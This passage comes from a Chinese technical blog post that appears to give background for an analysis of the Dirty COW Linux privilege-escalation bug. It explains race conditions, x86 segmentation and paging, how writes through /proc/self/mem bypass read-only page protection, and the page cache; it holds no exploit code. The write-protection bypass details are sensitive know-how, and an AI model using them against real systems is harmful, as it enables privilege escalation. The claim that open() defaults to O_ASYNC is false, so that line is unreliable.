8</span><br><span class="line">Thread 1382594304 has counter value 8</span><br><span class="line">Thread 1400035072 has counter value 8</span><br><span class="line">Thread 1275066112 has counter value 9</span><br><span class="line">Thread 1266345728 has counter value 10</span><br></pre></td></tr></table></figure><p>仔细思考一下条件竞争为什么可能会发生呢？以下面的为具体的例子</p><ul><li>程序首先执行了 action1，然后执行了 action2。其中 action 可能是应用级别的，也可能是操作系统级别的。正常来说，我们希望程序在执行 action2 时，action1 所产生的条件仍然是满足的。</li><li>但是由于程序的并发性，攻击者很有可能可以在 action2 执行之前的这个短暂的时间窗口中破坏 action1 所产生的条件。这时候攻击者的操作与 action2 产生了条件竞争，所以可能会影响程序的执行效果。</li></ul><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/time_interval.png" alt="img"></p><p>所以问题的根源在于程序员虽然假设某个条件在相应时间段应该是满足的，但是往往条件可能会在这个很小的时间窗口中被修改。<strong>虽然这个时间的间隔可能非常小，但是攻击者仍然可能可以通过执行某些操作（如计算密集型操作，Dos 攻击）使得受害机器的处理速度变得相对慢一些。</strong></p><h4 id="4、形式"><a href="#4、形式" class="headerlink" title="4、形式"></a>4、形式</h4><p>常见的条件竞争有以下形式。</p><h5 id="CWE-367-TOCTOU-Race-Condition"><a href="#CWE-367-TOCTOU-Race-Condition" class="headerlink" title="CWE-367: TOCTOU Race Condition"></a>CWE-367: TOCTOU Race Condition</h5><h6 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h6><p>TOCTOC (Time-of-check Time-of-use) 指的是程序在使用资源（变量，内存，文件）前会对进行检查，但是在程序使用对应的资源前，该资源却被修改了。</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/toctou.png" alt="img"></p><p>下面给出一些更加具体的例子。</p><h6 id="CWE-365-Race-Condition-in-Switch"><a href="#CWE-365-Race-Condition-in-Switch" class="headerlink" title="CWE-365: Race Condition in Switch"></a>CWE-365: Race Condition in Switch</h6><p>当程序正在执行 switch 语句时，如果 switch 变量的值被改变，那么就可能造成不可预知的行为。尤其在 case 语句后不写 break 语句的代码，一旦 switch 变量发生改变，很有可能会改变程序原有的逻辑。</p><h6 id="CWE-363-Race-Condition-Enabling-Link-Following"><a href="#CWE-363-Race-Condition-Enabling-Link-Following" class="headerlink" title="CWE-363: Race Condition Enabling Link Following"></a>CWE-363: Race Condition Enabling Link Following</h6><p>我们知道 Linux 中提供了两种对于文件的命名方式</p><ul><li>文件路径名</li><li>文件描述符</li></ul><p>但是，将这两种命名解析到相应对象上的方式有所不同</p><ul><li>文件路径名在解析的时候是通过传入的路径（文件名，硬链接，软连接）<strong>间接解析</strong>的，其传入的参数并不是相应文件的真实地址 (inode)。</li><li>文件描述符通过访问直接指向文件的指针来解析。</li></ul><p>正是由于间接性，产生了上面我们所说的时间窗口。</p><p>以下面的代码为例子，程序在访问某个文件之前，会检查是否存在，之后会打开文件然后执行操作。但是如果在检查之后，真正使用文件之前，攻击者将文件修改为某个符号链接，那么程序将访问错误的文件。</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/race_condition_file.png" alt="img"></p><p>这种条件竞争出现的问题的根源在于文件系统中的名字对象绑定的问题。而下面的函数都会使用文件名作为参数：access(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),…</p><p>那该如何避免这个问题呢？我们可以使用 fstat 函数来读取文件的信息并把它存入到 stat 结构体中，然后我们可以将该信息与我们已知的信息进行比较来判断我们是否读入了正确的信息。其中，stat 结构体中的 <code>st_ino</code> 和 <code>st_dev</code> 变量可以唯一表示文件</p><ul><li><code>st_ino</code> ，包含了文件的序列号，即 <code>i-node</code></li><li><code>st_dev</code> ，包含了文件对应的设备。</li></ul><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/race_condition_identify_file.png" alt="img"></p><h5 id="CWE-364-Signal-Handler-Race-Condition"><a href="#CWE-364-Signal-Handler-Race-Condition" class="headerlink" title="CWE-364: Signal Handler Race Condition"></a>CWE-364: Signal Handler Race Condition</h5><h6 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h6><p>条件竞争经常会发生在信号处理程序中，这是因为信号处理程序支持异步操作。尤其是当信号处理程序是<strong>不可重入</strong>的或者状态敏感的时候，攻击者可能通过利用信号处理程序中的条件竞争，可能可以达到拒绝服务攻击和代码执行的效果。比如说，如果在信号处理程序中执行了 free 操作，此时又来了一个信号，然后信号处理程序就会再次执行 free 操作，这时候就会出现 double free 的情况，再稍微操作一下，就可能可以达到任意地址写的效果了。</p><p>一般来说，与信号处理程序有关的常见的条件竞争情况有</p><ul><li>信号处理程序和普通的代码段共享全局变量和数据段。</li><li>在不同的信号处理程序中共享状态。</li><li>信号处理程序本身使用不可重入的函数，比如 malloc 和 free 。</li><li>一个信号处理函数处理多个信号，这可能会进而导致 use after free 和 double free 漏洞。</li><li>使用 setjmp 或者 longjmp 等机制来使得信号处理程序不能够返回原来的程序执行流。</li></ul><h6 id="线程安全与可重入"><a href="#线程安全与可重入" class="headerlink" title="线程安全与可重入"></a>线程安全与可重入</h6><p>这里说明一下线程安全与可重入的关系。</p><ul><li>线程安全<ul><li>即该函数可以被多个线程调用，而不会出现任何问题。</li><li>条件<ul><li>本身没有任何共享资源</li><li>有共享资源，需要加锁。</li></ul></li></ul></li><li>可重用<ul><li>一个函数可以被多个实例可以同时运行在相同的地址空间中。</li><li>可重入函数可以被中断，并且其它代码在进入该函数时，不会丢失数据的完整性。所以可重入函数一定是线程安全的。</li><li>可重入强调的是单个线程执行时，重新进入同一个子程序仍然是安全的。</li><li>不满足条件<ul><li>函数体内使用了静态数据结构，并且不是常量</li><li>函数体内使用了 malloc 或者 free 函数</li><li>函数使用了标准 IO 函数。</li><li>调用的函数不是可重入的。</li></ul></li><li>可重入函数使用的所有变量都保存在<a class="link"   href="https://zh.wikipedia.org/wiki/%E8%B0%83%E7%94%A8%E6%A0%88" >调用栈<i class="fas fa-external-link-alt"></i></a>的当前<a class="link"   href="https://zh.wikipedia.org/w/index.php?title=%E5%87%BD%E6%95%B0%E6%A0%88&action=edit&redlink=1" >函数栈<i class="fas fa-external-link-alt"></i></a>（frame）上。</li></ul></li></ul><h4 id="5、防范"><a href="#5、防范" class="headerlink" title="5、防范"></a>5、防范</h4><p>如果想要消除条件竞争，那么首要的目标是找到竞争窗口（race windows）。</p><p>所谓竞争窗口，就是访问竞争对象的代码段，这给攻击者相应的机会来修改相应的竞争对象。</p><p>一般来说，如果我们可以使得冲突的竞争窗口相互排斥，那么就可以消除竞争条件。</p><h5 id="同步原语"><a href="#同步原语" class="headerlink" title="同步原语"></a>同步原语</h5><p>一般来说，我们会使用同步原语来消除竞争条件。常见的如下</p><ul><li>锁变量<ul><li>通常互斥琐，在等待期间放弃 CPU，进入 idle 状态，过一段时间自动尝试。</li><li>自旋锁（spinlock），在等待期间不放弃 CPU，一直尝试。</li></ul></li><li>条件变量<ul><li><strong>条件变量是用来等待而不是用来上锁的。条件变量用来自动阻塞一个线程，直到某特殊情况发生为止。通常条件变量和互斥锁同时使用。</strong></li></ul></li><li>临界区对象，CRITICAL_SECTION</li><li>信号量（semaphore），控制可访问某个临界区的线程数量，一般比 1 大。</li><li>管道，指用于连接一个读进程和一个写进程以实现它们之间通信的一个共享文件。其生存期不超过创建管道的进程的生存期。</li><li>命名管道，生存期可以与操作系统运行期一样长。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建管道</span></span><br><span class="line">mkfifo my_pipe</span><br><span class="line"><span class="comment"># gzip从给定的管道中读取数据，并把数据压缩到out.gz中</span></span><br><span class="line">gzip -9 -c &lt; my_pipe &gt; out.gz &amp;</span><br><span class="line"><span class="comment"># 给管道传输数据</span></span><br><span class="line">cat file &gt; my_pipe</span><br></pre></td></tr></table></figure><p>仍要注意同步原语可能造成死锁的问题。</p><h3 id="三、虚拟内存"><a href="#三、虚拟内存" class="headerlink" title="三、虚拟内存"></a>三、虚拟内存</h3><p>由于物理内存是有限的，且直接通过操作物理内存并不是特别方便，在编写大型程序时尤为明显，所以目前操作系统都采用虚拟内存的技术。</p><p>虚拟内存技术可以使多个<a class="link"   href="https://zh.wikipedia.org/wiki/%E8%A1%8C%E7%A8%8B" >进程<i class="fas fa-external-link-alt"></i></a>共享同一个<a class="link"   href="https://zh.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB" >运行库<i class="fas fa-external-link-alt"></i></a>，并通过分割不同进程的内存空间来提高系统的安全性。进程自己的视角来看的内存是独立的，每个进程都可以全部的4G内存空间（32位下）。</p><p>而且进程的虚拟内存空间会被分成不同的若干区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在linux内核中，这样的区域被称之为虚拟内存区域(virtual memory areas，简称 VMA）。可以通过虚拟文件系统中的/proc/self/maps 即可查看当前进程的VMA，或者通过gdb的vmmap命令：</p><blockquote><p>下面这个就是VMA</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start      End        PermName</span><br><span class="line">0x08048000 0x080eb000 r-xp/mnt/hgfs/桌面/pwnable/calc/calc</span><br><span class="line">0x080eb000 0x080ed000 rw-p/mnt/hgfs/桌面/pwnable/calc/calc</span><br><span class="line">0x080ed000 0x08111000 rw-p[heap]</span><br><span class="line">0xf7ff9000 0xf7ffc000 r--p[vvar]</span><br><span class="line">0xf7ffc000 0xf7ffe000 r-xp[vdso]</span><br><span class="line">0xfffdd000 0xffffe000 rw-p[stack]</span><br></pre></td></tr></table></figure><p>在这个机制下，每个进程都有了自己的虚拟地址空间，但是最终还是要真正的存储在物理的内存上，所以虚拟空间中的地址一定与物理内存有一定的对应关系。在x86架构上，硬件有两种机制支持这种映射，即段式内存访问和页式内存访问，两种几乎为竞争关系。发展到现在，结果毋庸置疑，页式完胜。到了x64，段式内存访问就基本退出了历史舞台了。但是段寄存器仍然肩负着特权级保护的作用。所以这里我们主要介绍页式内存管理。</p><h4 id="1、段寄存器"><a href="#1、段寄存器" class="headerlink" title="1、段寄存器"></a>1、段寄存器</h4><h5 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h5><p>主要参考了[7]与[8]，段寄存器实际上是一种历史技术，在现在（x64系统）的应用场景中显得有些多余，但对历史解决寻址问题做出了比较大的贡献。</p><h5 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h5><p>段寄存器的产生源于Intel 8086 CPU体系结构中数据总线与地址总线的宽度不一致。</p><h5 id="16位CPU"><a href="#16位CPU" class="headerlink" title="16位CPU"></a>16位CPU</h5><p>8086处理器位数为16位，但是地址总线却为20根。为了能够访问到整个地址空间，在CPU里添加了4个段寄存器，分别为CS（代码段寄存器）DS（数据段寄存器） SS（堆栈段寄存器）ES(扩展数据段寄存器)。所以段寄存器就是为了解决CPU位数和地址总线不同的问题而诞生的。</p><p>Intel通过段寄存器寻址的方法是：通过4个段寄存器，CS，DS，ES和SS，把内存分为很多段，每一段有一个段基址，当然段基址也是一个20位的内存地址。不过段寄存器仍然是16位的，它的内容代表了段基址的高16位，这个16位的地址后面再加上4个0就构成20位的段基址。而原来的16位地址只是段内的偏移量。这样，一个完整的物理内存地址就由两部分组成，高16位的段基址和低16位的段内偏移量，当然它们有12位是重叠的，它们两部分相加在一起，才构成完整的物理地址。</p><p>Base            b15 ~ b12    b11 ~ b0     </p><p>Offset         o15 ~ o4    o3 ~ o0</p><p>Address        a19 ~ a0</p><p>这种寻址模式也就是“实地址模式”。在8086中，段寄存器还只是一个单纯的16位寄存器，而且操作寄存器的指令也不是特权指令。通过设置段寄存器和段内偏移，程序就可以访问整个物理内存，无安全性可言。</p><p>总之一句话，段寄存器的设计是一个权宜之计，现在看来可以说是一个临时性的解决方案，设计它的目的是为了把地址空间从64KB扩展为1MB，仅此而已。但是它的加入却为日后Intel系列芯片的发展带来诸多不便，也为理解i386体系带来困扰。</p><h5 id="32位CPU"><a href="#32位CPU" class="headerlink" title="32位CPU"></a>32位CPU</h5><p>到了我们处理器80386时候（保护模式），这时候cpu是32位，地址总线变成了32根，这时的寻址能力已经足够用，已经不再需要段寄存器来帮助扩展。但这时Intel已经无法把段寄存器从产品中去掉，因为新的CPU也是产品系列中的一员，根据兼容性的需要，段寄存器必须保留下来。除了先前的4个段寄存器CS DS SS ES，还引入了两个新的段寄存器FS、GS（附加数据段寄存器）。为了兼容性开率，他们均是16比特位宽。</p><p>很明显16比特位宽并不能很好的描述32位CPU的地址。这个时候增加了两个寄存器，GDTR（全局的段的描述附表），LDTR（局部的描述附表），他们分别指向了GDT(Global Descriptor Table)和LDT(Local Descriptor Table)。段描述符存储在 GDT 或者 LDT 中。GDT 或者 LDT 结构中包含基地址、段长度等信息。<strong>段寄存器</strong>CS DS SS ES<strong>存放的是段描述符在GDT或LDT内的索引值</strong>(index)。GDT 或者 LDT 中的基地址加上指令中的偏移量就可以得到需要的线性地址。如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">线性地址 = [ 段描述符 ]+段内偏移量</span><br></pre></td></tr></table></figure><p>备注：由于每个进程都可以有 LDT，而 GDT 只有一个，为满足需求 Intel 的做法是将 LDT 嵌套在 GDT 表中。</p><p>可以看到，32位操作系统中仍是段页式内存管理并存。</p><h5 id="64位CPU"><a href="#64位CPU" class="headerlink" title="64位CPU"></a>64位CPU</h5><p>在64位模式下：处理器把CS/DS/ES/SS的段基都当作0，忽略与之关联的段描述符中的段基地址。因为在64位模式中，CPU可以访问所有可寻址的内存空间。今天大多数的64位CPU只需要访问40位到48位的物理内存，因此不再需要段寄存器去扩展。<strong>页式存管本身是与段式存管分立的，两者没有什么关系。但对于Intel来说，同样是由于“段寄存器”这个历史的原因，它必须把页式存管建立在段式存管的基础之上，尽管这从设计的角度来说这是没有道理，也根本没有必要的。</strong></p><h5 id="CPU寻址与地址转换总结"><a href="#CPU寻址与地址转换总结" class="headerlink" title="CPU寻址与地址转换总结"></a>CPU寻址与地址转换总结</h5><p>【1】首先在16位或者更早的Intel CPU上，CPU工作在实模式，即直接使用物理地址，没有OS虚拟地址的概念。因此，在这些平台上，进行访问的线性地址 = 物理地址：</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/v2-579718b4f504316a56d3e8695f1a161d_720w.jpg" alt="img"></p><p>【2】在IA32上，x86工作在保护模式下时，分段单元将逻辑地址转换成线性地址，分页单元（MMU开启情况下）将线性地址转换成物理地址。当CPU启用了MMU，CPU核发出的地址将被MMU截获，从CPU到MMU的地址称为虚拟地址（Virtual Address，以下简称VA），而MMU将这个地址翻译成另一个地址发到CPU芯片的外部地址引脚上，也就是将虚拟地址映射成物理地址：</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/v2-f5bd16f2f8dff63aabb873374f5517bd_720w.jpg" alt="img"></p><p>【3】在x86_64上，处理器把CS/DS/ES/SS的段基都当作0，实际上摒弃了段式管理，不再使用。指令中使用的地址就是线性地址，当CPU开启MMU时，通过页式管理单元翻译成物理地址：</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/v2-e12e6284571311db6e87857455f7fcf3_720w.jpg" alt="img"></p><p>做个表格来体现一下</p><table><thead><tr><th>CPU位数</th><th>16位</th><th>32位</th><th>64位</th></tr></thead><tbody><tr><td>内存管理方式</td><td>段式内存管理</td><td>段页式内存管理</td><td>页式内存管理</td></tr></tbody></table><h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p>问：为什么32位CPU对应了32位总线仍需要段寄存器参与呢？</p><p>答：为了兼容保护模式的需要，通过段寄存器可以对内存做更细粒度的权限控制</p><h4 id="2、页式内存管理"><a href="#2、页式内存管理" class="headerlink" title="2、页式内存管理"></a>2、页式内存管理</h4><p>页式内存管理中把虚拟内存和物理内存都划分为长度大小固定的页，把虚拟内存页和真实的物理内存页的对应关系存储成一张表，就是页表，可以把页表想象成存放在内存中的一个大数组。</p><p>这个页表是每个进程都有的一个大数组，操作系统将这个大数组的起始地址存储到页表基址寄存器。这样即可通过查询页表将进程虚拟空间中的逻辑地址转换为内存条上的物理地址。使能页机制后，不仅能使进程获得相对独立的虚拟内存空间，而且通过对页表的结构设计出相应的权限控制，更安全的管理内存。</p><p>实际上就是一种细粒度的虚拟内存管理方式，更加合理有效的提高了内存的利用率。根据局部性原理，我们只需要在内存中保存少部分的页，大部分的页都可以换到磁盘中去。</p><p><img src="/2022/05/10/CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/YssggO.png" alt="YssggO.png"></p><h4 id="3、缺页中断"><a href="#3、缺页中断" class="headerlink" title="3、缺页中断"></a>3、缺页中断</h4><p>由于物理内存是有限的，操作系统会给某个进程分配固定数量的页框供进程使用，所以进程用到的逻辑页面的个数肯定要比分配到的物理页框的个数要多，但因为程序的执行是有空间局部性和时间局部性，所以在时间维度上可以暂时将不需要的页面从物理页框中换出到磁盘上（<strong>注意：这里出现了外部存储设备！</strong>），但是在逻辑内存空间中，即进程自己看到的内存空间中，进程自己是感受不到的，进程自己觉得自己的4G内存空间用的非常好。当进程访问到一个逻辑页面时，操作系统去查页表，发现这个逻辑页面不在内存中，那么则会去磁盘上找到刚才换出的页面，重新加载到内存，然后修好页表，然后重新去用逻辑地址查找这个物理地址，这个过程就是缺页中断。</p><p>简单来说就是缺页时将页从磁盘恢复到主存的过程。</p><p>不过这只是缺页中断的一种情况，在liunx的内存管理中，可能还会有其他情况也会出现缺页中断，例如首次访问某个逻辑地址时，或者需要触发写时复制时等等。</p><h4 id="4、-proc-self-mem"><a href="#4、-proc-self-mem" class="headerlink" title="4、/proc/self/mem"></a>4、/proc/self/mem</h4><p>整体总结：/proc/self/mem是当前进程的内存映射，对/proc/self/mem写可以对用户空间中的只读内存进行写入。可以写入只读内存基于的理念为<strong>内存权限的概念纯粹是对虚拟内存的约束，和物理内存无关</strong>。对/proc/self/mem写入的过程首先绕过MMU通过通过软件页表遍历将虚拟地址转换为物理地址，且遵循写时复制（COW）的概念，之后将物理地址映射到内核的可写内存中，之后对这块可写内存进行memcpy写入。</p><p>详细过程参考<a class="link"   href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/" >该文章<i class="fas fa-external-link-alt"></i></a>。</p><h5 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h5><p>proc文件系统是一个伪文件系统，它为内核数据结构提供接口。它通常安装在/proc。通常，它是由系统自动挂载的，但也可以使用如下命令手动挂载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc proc /proc </span><br></pre></td></tr></table></figure><p>proc文件系统中的大部分文件是只读的，但有些文件是可写的，允许要更改的内核变量。</p><h5 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a>/proc/self</h5><p>当进程访问这个神奇的符号链接时，它解析到进程自己的/proc/[pid]目录。</p><h5 id="proc-pid-mem"><a href="#proc-pid-mem" class="headerlink" title="/proc/[pid]/mem"></a>/proc/[pid]/mem</h5><p>该文件可通过open(2)，read(2)和lseek(2)用于访问进程的页面内存。访问此文件的权限由 ptrace 管理访问模式PTRACE_MODE_ATTACH_FSSCREDS检查；见ptrace(2)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_MODE_ATTACH_FSCREDS</span><br><span class="line">              Defined as PTRACE_MODE_ATTACH | PTRACE_MODE_FSCREDS.</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">PTRACE_MODE_ATTACH</span><br><span class="line">              For <span class="string">&quot;write&quot;</span> operations, <span class="keyword">or</span> other operations that are more</span><br><span class="line">              dangerous, such as: <span class="function">ptrace <span class="title">attaching</span> <span class="params">(PTRACE_ATTACH)</span> to</span></span><br><span class="line"><span class="function">              another process <span class="keyword">or</span> calling <span class="title">process_vm_writev</span><span class="params">(<span class="number">2</span>)</span>.</span></span><br><span class="line"><span class="function">              <span class="params">(PTRACE_MODE_ATTACH was effectively the <span class="keyword">default</span> before</span></span></span><br><span class="line"><span class="params"><span class="function">              Linux <span class="number">2.6</span><span class="number">.27</span>.)</span></span></span><br><span class="line"><span class="function">                  </span></span><br><span class="line"><span class="function">PTRACE_MODE_FSCREDS</span></span><br><span class="line"><span class="function">              Use the caller&#x27;s filesystem UID <span class="keyword">and</span> <span class="title">GID</span> <span class="params">(see</span></span></span><br><span class="line"><span class="params"><span class="function">              credentials(<span class="number">7</span>))</span> <span class="keyword">or</span> effective capabilities <span class="keyword">for</span> LSM checks.</span></span><br></pre></td></tr></table></figure><p>该文件是一个指向当前进程的虚拟内存文件的文件，当前进程可以通过对这个文件进行读写以直接读写虚拟内存空间，并无视内存映射时的权限设置。也就是说我们可以利用写/proc/self/mem来改写不具有写权限的虚拟内存。可以这么做的原因是/proc/self/mem是一个文件，只要进程对该文件具有写权限，那就可以随便写这个文件了，只不过对这个文件进行读写的时候需要一遍访问内存地址所需要寻页的流程。因为这个文件指向的是虚拟内存。</p><p>我对上面的/proc/self/mem的无视权限进行写入的表达是存疑的，这使得我又去网络上找到了相关的资料，参考<a class="link"   href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/" >[14]<i class="fas fa-external-link-alt"></i></a>。那么为什么可以这么做呢？首先了解一下限制内核访问内存的措施。</p><h6 id="限制内核访问内存的措施"><a href="#限制内核访问内存的措施" class="headerlink" title="限制内核访问内存的措施"></a>限制内核访问内存的措施</h6><p>首先在 x86-64 上有两个 CPU 选项控制内核访问内存的能力。且它们由内存管理单元 (MMU) 强制执行。</p><p>第一个设置是写保护位 (CR0.WP)。来自英特尔手册第 3 卷第 2.5 节：</p><blockquote><p><em>Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level procedures from writing into read- only pages; when clear, allows supervisor-level procedures to write into read-only pages (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6).</em></p></blockquote><p>大意是当该位置为1时将禁止管理员程序写入只读界面；当置为0时则允许管理员程序对制度页面的写入。</p><p>第二个设置是限制内核对用户内存的访问 (SMAP) (CR4.SMAP)。在英特尔手册第 3 卷第 4.6 节中的完整描述是很冗长的，但执行摘要的描述表示SMAP 完全禁用了内核读取或写入用户空间内存的能力。这为在用户空间中填充恶意数据使内核在利用期间读取的安全漏洞利用带来阻碍。</p><p>如果有问题的内核代码仅使用经过批准的通道来访问用户空间（copy_to_user 等），则可以忽略 SMAP——这些函数会在访问内存之前和之后自动切换 SMAP。但是如何绕过写保护？</p><p>清除 CR0.WP 后，/proc/*/mem 的内核实现确实能够直接地写入不可写的用户空间内存。</p><p>但是，CR0.WP<a class="link"   href="https://elixir.bootlin.com/linux/v5.12/source/arch/x86/kernel/head_64.S#L240" >默认为1<i class="fas fa-external-link-alt"></i></a>，并且通常在系统的生命周期内保持设置。在这种情况下，将触发页面错误以响应写入。作为一种促进写时复制的工具而不是安全边界，这对内核没有任何真正的限制。也就是说，它确实需要故障处理的不便，否则这是不必要的。</p><p>考虑到这一点，让我们查看一下实现。</p><h6 id="绕过写保护位-CR0-WP"><a href="#绕过写保护位-CR0-WP" class="headerlink" title="绕过写保护位 (CR0.WP)"></a>绕过写保护位 (CR0.WP)</h6><p>CR0.WP通过MMU进行检查，那我们直接绕过MMU即可，MMU用于虚拟内存“翻译”为物理内存。那么内核自己实现这样一套过程就可以绕过这个限制。</p><ol><li>调用 get_user_pages_remote() 查找目标虚拟地址对应的物理帧。</li><li>调用 kmap() 将该帧映射到内核的可写虚拟地址空间。</li><li>调用 copy_to_user_page() 以最终执行写入。</li></ol><p>首先**get_user_pages_remote()**：该函数最关键的功能就是将虚拟地址转化为物理地址，而这正是 get_user_pages() 系列函数所提供的。这些函数通过遍历页表来查找支持给定虚拟地址范围的物理内存帧。他们还处理访问验证和不存在的页面。其中FOLL_FORCE标志尤其重要。当其置为，则内核函数忽略不可写页面的写入并继续查找。</p><p>之后**kmap()**函数将物理帧映射到内核的虚拟地址空间中，并具有可写权限，在 64 位 x86 上，所有物理内存都通过内核虚拟地址空间的线性映射区域进行映射。在这种情况下，kmap() 是微不足道的——它只需要将线性映射的起始地址添加到帧的物理地址即可计算帧映射到的虚拟地址。而在 32 位 x86 上，线性映射包含物理内存的子集，因此 kmap() 可能需要通过分配 highmem 内存和操作页表来映射帧。在这两种情况下，<a class="link"   href="https://elixir.bootlin.com/linux/v5.9-rc3/source/arch/x86/mm/init.c#L559" >线性映射<i class="fas fa-external-link-alt"></i></a>和<a class="link"   href="https://elixir.bootlin.com/linux/v5.9-rc3/source/include/linux/highmem.h#L44" >highmem<i class="fas fa-external-link-alt"></i></a>映射都分配有<a class="link"   href="https://elixir.bootlin.com/linux/v5.9-rc3/source/arch/x86/include/asm/pgtable_types.h#L190" >PAGE_KERNEL<i class="fas fa-external-link-alt"></i></a>保护，即 RW。</p><p>最后**copy_to_user_page()**执行写入。本质上是一个memcpy</p><h6 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h6><p>这个实现的有趣之处在于它不涉及 CR0.WP。<strong>该实现通过利用它没必要通过从用户空间接收的指针访问内存这一事实巧妙地回避了内存权限的限制</strong>。由于内核完全控制着虚拟内存，它可以简单地将物理帧重新映射到自己的虚拟地址空间中，具有任意权限，并按照自己的意愿对其进行操作。</p><p>这很重要：<strong>保护内存页面的权限与用于访问该页面的虚拟地址相关联，而不是与支持该页面的物理框架相关联</strong>。实际上，内存权限的概念纯粹是对虚拟内存的考虑，与物理内存无关。</p><h3 id="四、linux-I-O"><a href="#四、linux-I-O" class="headerlink" title="四、linux I/O"></a>四、linux I/O</h3><h4 id="1、page-cache"><a href="#1、page-cache" class="headerlink" title="1、page cache"></a>1、page cache</h4><p>考虑到这样一个场景，在现有的linux环境下，当我们使用write/read进行读写文件时，我们操作的是磁盘文件吗？</p><p>带着这个疑问，我们思考一下，当涉及到文件操作时，操作系统必须解决两个严重的问题：</p><ol><li>当操作系统读做数据的访问操作时，对磁盘的访问速度远小于内存，文件越大，效果越明显。</li><li>当多个进程均访问同一个磁盘文件的内容时，由于进程数据隔离，不可能将文件内容在所有进程都拷贝一份。如果您使用 <a class="link"   href="http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx" >Process Explorer<i class="fas fa-external-link-alt"></i></a>查看 Windows 进程，您会看到每个进程中加载了大约 15MB 的常用 DLL。我的 Windows 机器现在正在运行 100 个进程，因此如果不共享，我将使用高达 ~1.5 GB 的物理 RAM<em>来处理常见的 DLL</em>。</li></ol><p>基于上面的观点，对内存的访问相较于对磁盘的访问来说更高效。</p><p>但是内存是有限的，我们不可能将磁盘上所有的内容都放入内存中，这时就需要对放入内存中的磁盘文件进行筛选。这时Page cache应运而生。</p><p>在计算机，page cache，有时也称为disk cache，它是一种透明缓存，用于存储源自二级存储设备（如硬盘驱动器(HDD) 或固态驱动器(SSD)）的页面。操作系统在主内存(RAM)的其他未使用部分中保留页面缓存，从而更快地访问缓存页面的内容并提高整体性能。页面缓存在内核中通过分页内存管理实现，并且对应用程序几乎是透明的。</p><p>由于硬盘和内存的读写性能差距巨大，Linux默认情况是以异步方式读写文件的。比如调用系统函数open()打开或者创建文件时缺省情况下是带有O_ASYNC flag的。Linux借助于内核的page cache来实现这种异步操作。引用《Understanding the Linux Kernel, 3rd Edition》中关于<code>page cache</code>的定义：</p><blockquote><p>The page cache is the main disk cache used by the Linux kernel. In most cases, the kernel refers to the page cache when reading from or writing to disk. New pages are added to the page cache to satisfy User Mode processes’s read requests. If the page is not already in the cache, a new entry is added to the cache and filled with the data read from the disk. If there is enough free memory, the page is kept in the cache for an indefinite period of time and can then be reused by other processes without accessing the disk.<br>Similarly, before writing a page of data to a block device, the kernel verifies whether the corresponding page is already included in the cache; if not, a new entry is added to the cache and filled with the data to be written on disk. The I/O data transfer does not start immediately: the disk update is delayed for a few seconds, thus giving a chance to the processes to further modify the data to be written (in other words, the kernel implements deferred write 